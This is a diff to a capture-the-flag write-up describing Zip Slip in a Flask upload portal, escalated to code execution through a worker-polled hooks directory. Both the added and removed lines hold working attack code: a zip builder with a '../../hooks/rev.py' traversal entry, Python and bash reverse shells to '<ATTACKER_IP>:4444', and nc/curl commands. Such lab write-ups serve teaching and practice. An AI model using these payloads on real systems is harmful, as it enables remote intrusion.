@@ -30,12 +30,12 @@ Extractor writes zip entries WITHOUT path sanitization  →  Zip Slip (arbitrary
         │  proven: ../ = shells/ , ../../ = app root , ../../static/ = web-served
         ▼
 Portal note: a "theme worker" applies automation HOOKS shortly after upload
+        │  (worker polls hooks/ every 20s and runs any *.py via python3)
+        ▼
+Zip Slip a reverse-shell .py into ../../hooks/  →  worker executes it
         │
         ▼
-Zip Slip a reverse-shell into ../../hooks/  →  worker executes it
-        │
-        ▼
-Shell as the app user  →  read the flag  →  FLAG
+Shell as roomservice  →  read the flag  →  FLAG
 ```
 
 Maps to the briefing: "upload a shell… the shell answers with a shell of your own"
@@ -128,32 +128,52 @@ Arbitrary *write* only becomes RCE at a location that gets *executed*. Flask
 static files don't auto-execute, overwriting `.py`/templates didn't fire (no
 `--reload`), and guessing hook filenames *inside the shell folder* did nothing.
 
-The portal note is explicit, though: a **"theme worker" applies automation
-hooks.** The worker watches a dedicated **`hooks/`** directory at the app root —
-so Zip Slip a payload *up into* `../../hooks/`, and the worker executes it.
+The portal note is explicit: a **"theme worker" applies automation hooks.** The
+worker is a separate script (`theme_worker.py`) whose logic is the intended path —
+recovered after the foothold, it reads:
+
+```python
+HOOKS_DIR   = os.path.join(BASE_DIR, "hooks")     # <approot>/hooks/
+POLL_SECONDS = 20
+def run_pending_hooks():
+    for path in sorted(glob.glob(os.path.join(HOOKS_DIR, "*.py"))):   # only *.py
+        code = open(path, "rb").read()
+        os.remove(path)                                              # deleted after read
+        proc = subprocess.Popen([sys.executable, "-"], stdin=subprocess.PIPE, ...)
+        proc.stdin.write(code)                                       # piped into python3
+```
+
+So the worker **polls `hooks/` every 20 seconds** and executes every **`.py`** file
+it finds (by piping it into `python3`), running as the app user. The target is
+therefore a Python reverse shell zip-slipped to **`../../hooks/rev.py`**:
 
 ```python
 import zipfile
 z = zipfile.ZipFile("/tmp/hk.zip","w")
 z.write("shell.json"); z.write("a.css")
 
-rev = "#!/bin/bash\nbash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1\n"
-# spray hooks/ at a few depths and names to cover the worker's expected path
-for d in ["../../hooks/","../hooks/","../../../hooks/","hooks/"]:
-    for n in ["hook.sh","apply.sh","run.sh","theme.sh"]:
-        z.writestr(d+n, rev)
+rev = ('import socket,subprocess,os\n'
+       's=socket.socket();s.connect(("<ATTACKER_IP>",4444))\n'
+       'os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2)\n'
+       'subprocess.call(["/bin/bash","-i"])\n')
+z.writestr("../../hooks/rev.py", rev)     # lands at <approot>/hooks/rev.py
 z.close()
 ```
 
-Start a listener, upload, and wait for the async worker ("shortly after"):
+Start a listener, upload, and wait up to the 20-second poll:
 
 ```bash
 nc -lvnp 4444                                                   # attacker box
 curl -s -b cookie.txt -F "shell=@/tmp/hk.zip" http://$IP:5000/upload -o /dev/null -L
-# watch the listener ~90s — the worker runs the hook and connects back
+# within ~20s the worker runs hooks/rev.py and the shell connects back
 ```
 
-The worker executes the hook and a **reverse shell** connects back.
+> **Key detail that matters:** the worker only runs **`.py`** — a `.sh` hook is
+> ignored (it isn't matched by `glob("*.py")`), and any check sooner than the
+> ~20-second poll shows nothing. Both are easy ways to wrongly conclude the hook
+> path "doesn't work." The winning target is a `.py` in `hooks/`, given ~20s.
+
+A **reverse shell** connects back as `roomservice`.
 
 ## Step 5 — Read the flag
 
@@ -217,11 +237,11 @@ curl -s -i http://$IP:5000/shells/<id>/sneaky.py
 # map Zip Slip depths (upload a multi-depth traversal zip, fetch the markers)
 #   ../ = shells/ , ../../ = app root , ../../static/ = web-served
 
-# RCE: zip-slip a reverse shell into the watched hooks/ dir
-#   zip entry name: ../../hooks/hook.sh   (payload: bash -i >& /dev/tcp/IP/4444 0>&1)
+# RCE: zip-slip a Python reverse shell into the watched hooks/ dir
+#   zip entry name: ../../hooks/rev.py   (worker runs *.py via python3, polls every 20s)
 nc -lvnp 4444
 curl -s -b cookie.txt -F "shell=@/tmp/hk.zip" http://$IP:5000/upload -o /dev/null -L
-# wait ~90s for the theme worker, catch the shell, read the flag
+# wait ~20s for the theme worker poll, catch the shell, read the flag
 ```
 
 ## Two things worth remembering
@@ -230,7 +250,12 @@ curl -s -b cookie.txt -F "shell=@/tmp/hk.zip" http://$IP:5000/upload -o /dev/nul
    "theme worker applies automation **hooks**" — the winning Zip Slip target was a
    `hooks/` directory at the app root, not a file inside the upload folder or a
    template. When arbitrary write is confirmed, the question is *what path gets
-   executed*, and the application often tells you where to look.
+   executed*, and the application often tells you where to look. The exact
+   mechanism (recovered from `theme_worker.py` after the foothold) was: poll
+   `hooks/` every 20s, run every `*.py` via `python3`. Two easy ways to wrongly
+   dismiss the right idea: using a `.sh` hook (ignored — it globs `*.py` only), or
+   checking sooner than the poll interval (nothing has run yet). Match the payload
+   to the worker's real filter and give it the poll time.
 2. **Zip Slip is only as good as your target.** Arbitrary file write is not RCE by
    itself — it becomes RCE at a location something *runs*: a cron dir, a startup
    file, or (here) a worker-watched hooks directory. Match the write target to the
